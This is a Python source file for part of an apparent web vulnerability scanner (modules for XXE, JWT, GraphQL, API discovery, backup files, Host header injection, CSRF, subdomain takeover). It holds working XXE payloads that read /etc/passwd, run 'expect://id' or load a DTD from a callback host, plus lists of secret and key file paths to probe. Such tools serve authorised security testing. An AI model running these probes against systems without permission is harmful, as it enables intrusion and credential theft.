"""modules 23-30: xxe, jwt, graphql, api, backups, host header, csrf, takeover."""

import asyncio
import json
import random
import re
import time
from http.cookies import SimpleCookie
from urllib.parse import urlparse

from .core import is_ok, b64d, split_set_cookie


XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
     ["root:x:0:0:", "daemon:x:", "nobody:x:"]),
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
     ["[boot loader]", "[fonts]", "[extensions]"]),
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://BXSS_HOST/xxe.dtd">%remote;]><root/>',
     []),
    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
     ["uid=", "gid="]),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
     ["localhost", "127.0.0.1"]),
]


async def m23(client, url, ctx):
    findings = []
    tested = 0
    bxss_host = ctx.get("bxss_host", "")

    for payload_tmpl, patterns in XXE_PAYLOADS:
        if "BXSS_HOST" in payload_tmpl:
            if not bxss_host:
                continue
            payload = payload_tmpl.replace("BXSS_HOST", bxss_host)
        else:
            payload = payload_tmpl
        tested += 1
        r = await client.post(url, data=payload,
                              headers={"Content-Type": "application/xml"})
        if not is_ok(r):
            continue
        for pat in patterns:
            if re.search(pat, r["body"], re.I):
                findings.append({"evidence": pat, "status": r["status"],
                                 "payload": payload[:100]})

    for payload_tmpl, patterns in XXE_PAYLOADS[:2]:
        tested += 1
        r = await client.post(url, json={"xml": payload_tmpl})
        if not is_ok(r):
            continue
        for pat in patterns:
            if re.search(pat, r["body"], re.I):
                findings.append({"evidence": pat, "status": r["status"],
                                 "vector": "json-wrap",
                                 "payload": payload_tmpl[:80]})

    return {"tested": tested, "findings": findings,
            "note": "POSTed XML payloads — check if body parsed external entities"}


def _collect_tokens_from_response(r):
    tokens = []
    for raw in r["headers"].get("Set-Cookie", "").split(","):
        m = re.search(r"(eyJ[\w-]+\.[\w-]+\.[\w-]*)", raw)
        if m:
            tokens.append(("cookie", m.group(1)))
    auth_hdr = r["headers"].get("Authorization", "")
    m = re.search(r"(eyJ[\w-]+\.[\w-]+\.[\w-]*)", auth_hdr)
    if m:
        tokens.append(("auth-header", m.group(1)))
    for m in re.finditer(r"(eyJ[\w-]+\.[\w-]+\.[\w-]*)", r["body"]):
        tokens.append(("body", m.group(1)))
    return tokens


def _analyze_token(src, tok):
    parts = tok.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(b64d(parts[0]))
        payload = json.loads(b64d(parts[1]))
    except Exception:
        return None
    if not isinstance(header, dict) or "alg" not in header:
        return None
    if not isinstance(payload, dict):
        return None

    issues = []
    alg = str(header.get("alg", "")).lower()

    if alg == "none":
        issues.append({"severity": "critical",
                       "issue": "alg=none — unsigned token accepted"})
    if alg in ("hs256", "hs384", "hs512"):
        issues.append({"severity": "medium",
                       "issue": f"{alg} — alg confusion risk if server accepts RS->HS"})

    sig = parts[2]
    if not sig.strip():
        issues.append({"severity": "high", "issue": "empty signature"})
    elif not re.fullmatch(r"[A-Za-z0-9_\-]+", sig):
        issues.append({"severity": "high",
                       "issue": "signature contains non-base64url chars (tampered?)"})
    elif len(sig) < 32:
        issues.append({"severity": "medium",
                       "issue": f"short signature ({len(sig)} chars)"})

    if "kid" in header:
        issues.append({"severity": "high",
                       "issue": "kid header present — path traversal risk"})
    if "jku" in header or "x5u" in header:
        issues.append({"severity": "high",
                       "issue": "jku/x5u present — SSRF/hijack risk"})
    if "exp" not in payload:
        issues.append({"severity": "low", "issue": "no expiration (exp)"})
    else:
        try:
            exp = int(payload["exp"])
            if exp < time.time():
                issues.append({"severity": "info",
                               "issue": "token already expired"})
        except Exception:
            pass
    if payload.get("admin") is True or payload.get("is_admin") is True:
        issues.append({"severity": "critical",
                       "issue": "admin claim present in token"})

    return {"source": src, "header": header,
            "payload_keys": list(payload.keys()), "issues": issues}


async def m24(client, url, ctx):
    tokens = []

    r = await client.get(url)
    if is_ok(r):
        tokens.extend(_collect_tokens_from_response(r))

    auth = ctx.get("auth") or {}
    for name, val in (auth.get("cookies") or {}).items():
        if isinstance(val, str) and val.startswith("eyJ"):
            tokens.append((f"auth-cookie:{name}", val))
    for name, val in (auth.get("headers") or {}).items():
        m = re.search(r"(eyJ[\w-]+\.[\w-]+\.[\w-]*)", str(val))
        if m:
            tokens.append((f"auth-header:{name}", m.group(1)))

    seen = set()
    analysis = []
    for src, tok in tokens:
        if tok in seen:
            continue
        seen.add(tok)
        a = _analyze_token(src, tok)
        if a:
            analysis.append(a)

    return {"tokens_found": len(analysis), "analysis": analysis}


GRAPHQL_QUERIES = [
    {"query": "{__schema{types{name kind fields{name type{name kind ofType{name kind}}}}}}"},
    {"query": "{__schema{queryType{name} mutationType{name} subscriptionType{name}}}"},
    {"query": "query{__typename}"},
]


async def m25(client, url, ctx):
    candidates = [
        url.rstrip("/") + "/graphql",
        url.rstrip("/") + "/graphiql",
        url.rstrip("/") + "/api/graphql",
        url.rstrip("/") + "/v1/graphql",
        url.rstrip("/") + "/v2/graphql",
        url.rstrip("/") + "/query",
        url.rstrip("/") + "/gql",
    ]
    found = []
    seen_resolved = set()

    for u in candidates:
        for q in GRAPHQL_QUERIES:
            r = await client.post(u, json=q)
            if not is_ok(r):
                continue
            if r["status"] != 200:
                continue
            if "__schema" not in r["body"] and "__typename" not in r["body"]:
                continue

            resolved = r.get("url") or u
            if resolved in seen_resolved:
                break
            seen_resolved.add(resolved)

            try:
                data = json.loads(r["body"])
            except Exception:
                found.append({"endpoint": resolved, "note": "parse failed"})
                break

            data_payload = data.get("data") if isinstance(data, dict) else None
            if not isinstance(data_payload, dict):
                found.append({"endpoint": resolved,
                              "note": "introspection returned data=null (error or disabled)"})
                break

            schema = data_payload.get("__schema")
            if not isinstance(schema, dict):
                found.append({"endpoint": resolved,
                              "note": "__schema present in body but not in parsed JSON"})
                break

            types = schema.get("types", [])
            type_names = [t["name"] for t in types
                          if isinstance(t, dict) and "name" in t
                          and not t["name"].startswith("__")]
            found.append({
                "endpoint": resolved,
                "types": type_names[:60],
                "type_count": len(type_names),
                "query_type": (schema.get("queryType") or {}).get("name"),
                "mutation_type": (schema.get("mutationType") or {}).get("name"),
                "subscription_type": (schema.get("subscriptionType") or {}).get("name"),
            })
            break

    return {"tested": len(candidates), "findings": found}


API_PATHS = [
    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3",
    "/api/v1/users", "/api/v1/auth", "/api/v1/login",
    "/api/health", "/api/status", "/api/metrics",
    "/api/docs", "/api/swagger.json", "/api/openapi.json",
    "/rest", "/rest/v1", "/v1", "/v2", "/v3",
    "/graphql", "/api/graphql", "/api/users", "/api/config",
    "/api/admin", "/api/debug", "/api/info",
    "/wp-json/wp/v2/users", "/wp-json/", "/wp-json/wp/v2/posts",
    "/.well-known/openapi.json",
    "/swagger.json", "/swagger/v1/swagger.json",
    "/openapi.json", "/openapi.yaml",
    "/api/v1/swagger", "/api/v2/swagger",
    "/metrics", "/health", "/healthz", "/ready", "/live",
    "/api/v1/health", "/api/v1/status", "/api/v1/metrics",
]


async def m26(client, url, ctx):
    sem = asyncio.Semaphore(15)

    async def probe(p):
        async with sem:
            r = await client.get(url.rstrip("/") + p)
            if not is_ok(r):
                return None
            if r["status"] in (200, 201, 204, 401, 403):
                ct = r["headers"].get("Content-Type", "")
                return {"path": p, "status": r["status"],
                        "length": r["length"], "type": ct,
                        "json": "json" in ct.lower()}
            return None

    results = await asyncio.gather(*[probe(p) for p in API_PATHS],
                                   return_exceptions=True)
    found = sorted([r for r in results if isinstance(r, dict)],
                   key=lambda x: x["status"])
    return {"tested": len(API_PATHS), "endpoints": found}


BACKUP_PATHS = [
    ".env.bak", ".env.swp", ".env.save", ".env.orig", ".env.prod",
    ".env.backup", ".env.local.bak", ".env.dev",
    "wp-config.php.bak", "wp-config.php.save", "wp-config.php.swp",
    "wp-config.php.old", "wp-config.php.orig", "wp-config.php~",
    "config.php.bak", "config.php.save", "config.php.swp", "config.php~",
    "config.php.old", "config.php.orig", "config.php.txt",
    "configuration.php.bak", "configuration.php~",
    "settings.php.bak", "settings.php~",
    "database.sql.bak", "db.sql.bak", "dump.sql.bak", "backup.sql.bak",
    "database.sqlite.bak", "database.db.bak",
    "index.php.bak", "index.php~", "index.php.old",
    "backup.tar.gz.bak", "backup.tar.gz.old", "backup.tar.gz",
    "backup.zip", "backup.tar", "backup.sql", "backup.rar", "backup.7z",
    "site.zip", "www.zip", "htdocs.zip", "public_html.zip",
    ".git/index", ".git/logs/HEAD", ".git/refs/heads/master",
    ".git/refs/heads/main", ".git/packed-refs", ".git/description",
    ".git/HEAD", ".git/config",
    ".svn/wc.db", ".svn/entries",
    ".hg/store", ".hg/requires",
    "composer.lock.bak", "package.json.bak", "yarn.lock.bak",
    "web.config.bak", "appsettings.json.bak",
    "appsettings.Development.json", "appsettings.Production.json",
    ".envrc", ".envrc.local",
    "config.bak", "settings.bak", "secrets.yml", "secrets.yaml",
    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
    ".ssh/id_rsa", ".ssh/authorized_keys", ".ssh/known_hosts",
    "credentials", "credentials.json", "credentials.yml",
    "docker-compose.yml.bak", "Dockerfile.bak",
    "terraform.tfstate", "terraform.tfstate.backup",
    "phpinfo.php.bak", "server-status.bak",
]


async def m27(client, url, ctx):
    if not ctx.get("aggressive"):
        return {"note": "aggressive mode required (--aggressive) for backup probes",
                "tested": 0, "found": []}

    found = []
    sem = asyncio.Semaphore(20)

    async def probe(p):
        async with sem:
            r = await client.get(url.rstrip("/") + "/" + p)
            if not is_ok(r):
                return None
            if r["status"] == 200 and r["length"] > 30:
                return {"path": "/" + p, "status": r["status"],
                        "length": r["length"],
                        "snippet": r["body"][:120].replace("\n", " ").replace("\r", "")}
            return None

    results = await asyncio.gather(*[probe(p) for p in BACKUP_PATHS],
                                   return_exceptions=True)
    for r in results:
        if isinstance(r, dict):
            found.append(r)
    return {"tested": len(BACKUP_PATHS), "found": found}


async def m28(client, url, ctx):
    tests = ["evil.com", "127.0.0.1", "localhost", "169.254.169.254",
             "evil.com:80", "evil.com:443", "evil.com@target",
             "evil.com target"]
    findings = []

    base = await client.get(url)
    base_body = base.get("body", "") if is_ok(base) else ""
    base_loc = base.get("headers", {}).get("Location", "") if is_ok(base) else ""

    rnd_host = f"rand-{random.randint(100000, 999999)}.invalid"
    r_rand = await client.get(url, headers={"Host": rnd_host},
                              allow_redirects=False)
    rand_body = r_rand.get("body", "") if is_ok(r_rand) else ""
    rand_loc = (r_rand.get("headers", {}).get("Location", "")
                if is_ok(r_rand) else "")

    def _reflected_in_body(needle, probe_body):
        if needle not in probe_body:
            return False
        if needle in base_body:
            return False
        if needle in rand_body:
            return False
        return True

    for host in tests:
        r = await client.get(url, headers={"Host": host},
                             allow_redirects=False)
        if not is_ok(r):
            continue
        loc = r["headers"].get("Location", "")
        if loc and loc != base_loc and loc != rand_loc:
            if "evil.com" in loc or (host in loc and "evil" in host):
                findings.append({"host": host,
                                 "issue": "Host reflected in redirect",
                                 "location": loc, "severity": "high"})
        if _reflected_in_body(host, r["body"]):
            findings.append({"host": host,
                             "issue": "Host reflected in body",
                             "severity": "medium"})

    for hdr in ["X-Forwarded-Host", "X-Forwarded-Server",
                "X-Original-Host", "X-Rewrite-URL"]:
        r = await client.get(url, headers={hdr: "evil.com"},
                             allow_redirects=False)
        if not is_ok(r):
            continue
        if _reflected_in_body("evil.com", r["body"]):
            findings.append({"host": hdr,
                             "issue": f"{hdr} reflected in body",
                             "severity": "medium"})

    return {"tested": len(tests) + 4,
            "baseline_host": rnd_host,
            "findings": findings}


async def m29(client, url, ctx):
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    weak_names = {"session", "sessionid", "sid", "auth", "token", "jsessionid"}

    paths_to_probe = [url, base + "/login", base + "/signin",
                      base + "/auth/login", base + "/admin/login"]

    session_cookies = []
    paths_checked = 0
    for p in paths_to_probe:
        r = await client.get(p)
        if not is_ok(r):
            continue
        paths_checked += 1
        for block in split_set_cookie(r["headers"].get("Set-Cookie", "")):
            sc = SimpleCookie()
            try:
                sc.load(block)
            except Exception:
                continue
            for name, morsel in sc.items():
                if name.lower() in weak_names:
                    session_cookies.append({
                        "name": name,
                        "samesite": (morsel.get("samesite") or "").lower(),
                        "secure": bool(morsel.get("secure")),
                        "path": p,
                    })

    session_with_samesite = any(
        c["samesite"] in ("lax", "strict") for c in session_cookies)
    session_cookie_present = len(session_cookies) > 0

    r = await client.get(url)
    if not is_ok(r):
        return {"error": r.get("error", "request failed")}

    body = r["body"]
    lower = body.lower()

    token_patterns = [
        "csrf", "csrfmiddlewaretoken", "csrf_token", "authenticity_token",
        "xsrf", "_token", "__requestverificationtoken", "csrf-token",
        "antiforgerytoken", "requestverificationtoken",
    ]
    tokens_present = [p for p in token_patterns if p in lower]

    forms = re.findall(r"<form\b[^>]*>.*?</form>", body, re.I | re.S)
    total_forms = len(forms)
    post_forms = 0
    forms_without_token = 0
    form_details = []

    for form_html in forms:
        action_m = re.search(r'action=["\']([^"\']*)', form_html, re.I)
        method_m = re.search(r'method=["\'](\w+)', form_html, re.I)
        action = action_m.group(1) if action_m else ""
        method = (method_m.group(1) if method_m else "GET").upper()

        if method == "POST":
            post_forms += 1
            has_token = any(t in form_html.lower() for t in token_patterns)
            if not has_token:
                forms_without_token += 1
                form_details.append({
                    "action": action, "method": method,
                    "issue": "no csrf token",
                })

    findings = []
    if post_forms > 0 and forms_without_token > 0:
        if session_cookie_present and not session_with_samesite:
            findings.append({
                "issue": f"{forms_without_token}/{post_forms} POST forms lack CSRF token "
                         f"and {len(session_cookies)} session cookie(s) lack SameSite",
                "severity": "high",
            })
        elif not session_cookie_present:
            findings.append({
                "issue": f"{forms_without_token}/{post_forms} POST forms lack CSRF token "
                         f"(no session cookie observed — CSRF via cookie unknown)",
                "severity": "medium",
            })

    return {
        "tokens_present": tokens_present,
        "total_forms": total_forms,
        "post_forms": post_forms,
        "post_forms_without_csrf_token": forms_without_token,
        "form_details": form_details,
        "session_cookies": session_cookies,
        "session_cookie_present": session_cookie_present,
        "session_with_samesite": session_with_samesite,
        "paths_checked": paths_checked,
        "findings": findings,
    }


TAKEOVER_SIGS = {
    "github.io": "There isn't a GitHub Pages site here",
    "github.com": "Repository not found",
    "herokuapp.com": "No such app",
    "herokussl.com": "No such app",
    "s3.amazonaws.com": "NoSuchBucket",
    "cloudfront.net": "Bad request",
    "azurewebsites.net": "404 Web Site not found",
    "cloudapp.net": "404 Web Site not found",
    "trafficmanager.net": "not found",
    "shopify.com": "Sorry, this shop is currently unavailable",
    "myshopify.com": "Sorry, this shop is currently unavailable",
    "readme.io": "Project doesnt exist",
    "surge.sh": "project not found",
    "bitbucket.io": "Repository not found",
    "ghost.io": "Domain error",
    "zendesk.com": "Help Center Closed",
    "wordpress.com": "doesn\u2019t exist",
    "fastly.net": "Fastly error: unknown domain",
    "pantheon.io": "The gods are wise, but do not know of the site",
    "tumblr.com": "There's nothing here",
    "unbounce.com": "The requested URL was not found on this server",
    "uservoice.com": "This UserVoice subdomain is currently available",
    "freshdesk.com": "May be the account has been deleted",
    "helpscoutdocs.com": "No settings were found for this company",
    "statuspage.io": "This page is either private or does not exist",
    "teamwork.com": "Nothing to see here",
    "pingdom.com": "This public status page does not exist",
    "intercom.help": "This page is not available",
    "ngrok.io": "Tunnel not found",
    "strikingly.com": "page not found",
    "webflow.io": "This site is not published",
    "squarespace.com": "Domain Not Claimed",
    "kinsta.com": "No site configured at this address",
    "wpengine.com": "Site Not Found",
}


async def m30(client, url, ctx):
    host = ctx.get("host") or urlparse(url).hostname or ""
    findings = []

    r = await client.get(url)
    if not is_ok(r):
        return {"error": r.get("error", "request failed"),
                "tested": 0, "findings": []}

    base_body = r["body"].lower()
    for svc, sig in TAKEOVER_SIGS.items():
        if sig.lower() in base_body:
            findings.append({"service": svc, "signature": sig,
                             "host": host, "note": "dangling CNAME likely"})

    subdomains = (ctx.get("target_subdomains")
                  or ctx.get("discovered_subdomains")
                  or [])
    sem = asyncio.Semaphore(5)

    async def probe(sub):
        async with sem:
            for scheme in ("https", "http"):
                try:
                    rr = await client.get(f"{scheme}://{sub}",
                                          allow_redirects=False,
                                          auth=False)
                except Exception:
                    continue
                if not is_ok(rr):
                    continue
                sb = rr["body"].lower()
                for svc, sig in TAKEOVER_SIGS.items():
                    if sig.lower() in sb and sig.lower() not in base_body:
                        return {"service": svc, "signature": sig,
                                "host": sub,
                                "note": "dangling CNAME likely"}
                return None
        return None

    targets = subdomains[:20]
    if targets:
        results = await asyncio.gather(*[probe(s) for s in targets],
                                       return_exceptions=True)
        for res in results:
            if isinstance(res, dict):
                findings.append(res)

    return {"host": host, "tested": len(TAKEOVER_SIGS),
            "subdomains_checked": len(targets), "findings": findings}


MODULES = [
    ("23_xxe", "XXE (5 XML + real-JSON wrap, accurate count)", m23),
    ("24_jwt", "JWT analyzer (incl. ctx auth tokens, strict sig check)", m24),
    ("25_graphql", "GraphQL introspection (7 endpoints, data=null safe)", m25),
    ("26_api", "API endpoint discovery (43 paths)", m26),
    ("27_backups", "Backup / config deep probes (~80 paths, aggressive)", m27),
    ("28_host_header", "Host header injection (8 hosts + 4 X-headers, baseline diff)", m28),
    ("29_csrf", "CSRF audit (forms + multi-path SameSite check)", m29),
    ("30_takeover", "Subdomain takeover (35 sigs, off-scope auth=False)", m30),
]
